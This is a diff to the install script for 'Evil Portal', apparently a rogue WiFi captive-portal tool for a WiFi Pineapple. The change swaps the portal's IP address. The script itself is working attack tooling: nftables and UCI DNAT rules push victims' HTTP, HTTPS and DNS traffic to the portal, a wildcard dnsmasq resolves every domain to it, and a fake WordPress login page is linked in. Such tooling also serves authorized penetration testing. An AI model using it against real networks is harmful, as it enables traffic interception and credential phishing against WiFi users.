@@ -417,21 +417,21 @@ START=99
 add_nft_rules() {
     # Add TEMPORARY nftables rules to the main dstnat chain with interface match
     # These disappear on reboot since they're not in UCI config
-    nft insert rule inet fw4 dstnat iifname "br-evil" meta nfproto ipv4 tcp dport 443 counter dnat ip to 172.16.52.1:80
-    nft insert rule inet fw4 dstnat iifname "br-evil" meta nfproto ipv4 tcp dport 80 counter dnat ip to 172.16.52.1:80
-    nft insert rule inet fw4 dstnat iifname "br-evil" meta nfproto ipv4 tcp dport 53 counter dnat ip to 172.16.52.1:5353
-    nft insert rule inet fw4 dstnat iifname "br-evil" meta nfproto ipv4 udp dport 53 counter dnat ip to 172.16.52.1:5353
+    nft insert rule inet fw4 dstnat iifname "br-evil" meta nfproto ipv4 tcp dport 443 counter dnat ip to 10.0.0.1:80
+    nft insert rule inet fw4 dstnat iifname "br-evil" meta nfproto ipv4 tcp dport 80 counter dnat ip to 10.0.0.1:80
+    nft insert rule inet fw4 dstnat iifname "br-evil" meta nfproto ipv4 tcp dport 53 counter dnat ip to 10.0.0.1:5353
+    nft insert rule inet fw4 dstnat iifname "br-evil" meta nfproto ipv4 udp dport 53 counter dnat ip to 10.0.0.1:5353
 }
 
 # Helper function to remove nft rules from memory
 remove_nft_rules() {
     # Remove temporary rules from dstnat chain (the ones we added with iifname match)
-    nft -a list chain inet fw4 dstnat 2>/dev/null | grep "dnat ip to 172.16.52.1" | awk '{print $NF}' | while read handle; do
+    nft -a list chain inet fw4 dstnat 2>/dev/null | grep "dnat ip to 10.0.0.1" | awk '{print $NF}' | while read handle; do
         nft delete rule inet fw4 dstnat handle "$handle" 2>/dev/null
     done
     
     # Also remove from dstnat_lan if it exists (for UCI-created rules)
-    nft -a list chain inet fw4 dstnat_lan 2>/dev/null | grep "dnat ip to 172.16.52.1" | awk '{print $NF}' | while read handle; do
+    nft -a list chain inet fw4 dstnat_lan 2>/dev/null | grep "dnat ip to 10.0.0.1" | awk '{print $NF}' | while read handle; do
         nft delete rule inet fw4 dstnat_lan handle "$handle" 2>/dev/null
     done
 }
@@ -458,7 +458,7 @@ start_services() {
     /etc/init.d/php8-fpm start
     /etc/init.d/nginx start
     kill $(netstat -plant 2>/dev/null | grep ':5353' | awk '{print $NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
-    dnsmasq --no-hosts --no-resolv --address=/#/172.16.52.1 -p 5353 &
+    dnsmasq --no-hosts --no-resolv --address=/#/10.0.0.1 -p 5353 &
     rm -f /www/captiveportal
     ln -s /pineapple/ui/modules/evilportal/assets/api /www/captiveportal
     ln -sf /root/portals/Wordpress/index.php /www/index.php
@@ -515,7 +515,7 @@ enable() {
     uci set firewall.@redirect[-1].src='lan'
     uci set firewall.@redirect[-1].proto='tcp'
     uci set firewall.@redirect[-1].src_dport='443'
-    uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+    uci set firewall.@redirect[-1].dest_ip='10.0.0.1'
     uci set firewall.@redirect[-1].dest_port='80'
     uci set firewall.@redirect[-1].target='DNAT'
 
@@ -524,7 +524,7 @@ enable() {
     uci set firewall.@redirect[-1].src='lan'
     uci set firewall.@redirect[-1].proto='tcp'
     uci set firewall.@redirect[-1].src_dport='80'
-    uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+    uci set firewall.@redirect[-1].dest_ip='10.0.0.1'
     uci set firewall.@redirect[-1].dest_port='80'
     uci set firewall.@redirect[-1].target='DNAT'
 
@@ -533,7 +533,7 @@ enable() {
     uci set firewall.@redirect[-1].src='lan'
     uci set firewall.@redirect[-1].proto='tcp'
     uci set firewall.@redirect[-1].src_dport='53'
-    uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+    uci set firewall.@redirect[-1].dest_ip='10.0.0.1'
     uci set firewall.@redirect[-1].dest_port='5353'
     uci set firewall.@redirect[-1].target='DNAT'
 
@@ -542,7 +542,7 @@ enable() {
     uci set firewall.@redirect[-1].src='lan'
     uci set firewall.@redirect[-1].proto='udp'
     uci set firewall.@redirect[-1].src_dport='53'
-    uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+    uci set firewall.@redirect[-1].dest_ip='10.0.0.1'
     uci set firewall.@redirect[-1].dest_port='5353'
     uci set firewall.@redirect[-1].target='DNAT'
 
@@ -630,7 +630,7 @@ uci set firewall.@redirect[-1].name='Evil Portal HTTPS'
 uci set firewall.@redirect[-1].src='lan'
 uci set firewall.@redirect[-1].proto='tcp'
 uci set firewall.@redirect[-1].src_dport='443'
-uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+uci set firewall.@redirect[-1].dest_ip='10.0.0.1'
 uci set firewall.@redirect[-1].dest_port='80'
 uci set firewall.@redirect[-1].target='DNAT'
 
@@ -639,7 +639,7 @@ uci set firewall.@redirect[-1].name='Evil Portal HTTP'
 uci set firewall.@redirect[-1].src='lan'
 uci set firewall.@redirect[-1].proto='tcp'
 uci set firewall.@redirect[-1].src_dport='80'
-uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+uci set firewall.@redirect[-1].dest_ip='10.0.0.1'
 uci set firewall.@redirect[-1].dest_port='80'
 uci set firewall.@redirect[-1].target='DNAT'
 
@@ -648,7 +648,7 @@ uci set firewall.@redirect[-1].name='Evil Portal DNS TCP'
 uci set firewall.@redirect[-1].src='lan'
 uci set firewall.@redirect[-1].proto='tcp'
 uci set firewall.@redirect[-1].src_dport='53'
-uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+uci set firewall.@redirect[-1].dest_ip='10.0.0.1'
 uci set firewall.@redirect[-1].dest_port='5353'
 uci set firewall.@redirect[-1].target='DNAT'
 
@@ -657,7 +657,7 @@ uci set firewall.@redirect[-1].name='Evil Portal DNS UDP'
 uci set firewall.@redirect[-1].src='lan'
 uci set firewall.@redirect[-1].proto='udp'
 uci set firewall.@redirect[-1].src_dport='53'
-uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+uci set firewall.@redirect[-1].dest_ip='10.0.0.1'
 uci set firewall.@redirect[-1].dest_port='5353'
 uci set firewall.@redirect[-1].target='DNAT'
 
@@ -724,7 +724,7 @@ LOG "Step 10: Running verification tests..."
 
 # Test portal HTTP response
 LOG "Testing portal HTTP response..."
-if curl -s http://172.16.52.1/ | grep -q "Evil Portal"; then
+if curl -s http://10.0.0.1/ | grep -q "Evil Portal"; then
     LOG "SUCCESS: Portal HTTP responding"
 else
     LOG "WARNING: Portal HTTP not responding correctly"
@@ -732,7 +732,7 @@ fi
 
 # Verify NAT rules exist
 LOG "Verifying NAT rules..."
-if nft list chain inet fw4 dstnat 2>/dev/null | grep -q "172.16.52.1"; then
+if nft list chain inet fw4 dstnat 2>/dev/null | grep -q "10.0.0.1"; then
     LOG "SUCCESS: NAT rules configured"
 else
     LOG "ERROR: NAT rules not found"
@@ -753,7 +753,7 @@ fi
 LOG "=================================================="
 LOG "Evil Portal Installation Complete!"
 LOG "=================================================="
-LOG "Portal URL: http://172.16.52.1/"
+LOG "Portal URL: http://10.0.0.1/"
 LOG "Services Status:"
 LOG "  - PHP-FPM: $(pgrep php8-fpm > /dev/null && echo 'Running' || echo 'Stopped')"
 LOG "  - nginx: $(pgrep nginx > /dev/null && echo 'Running' || echo 'Stopped')"
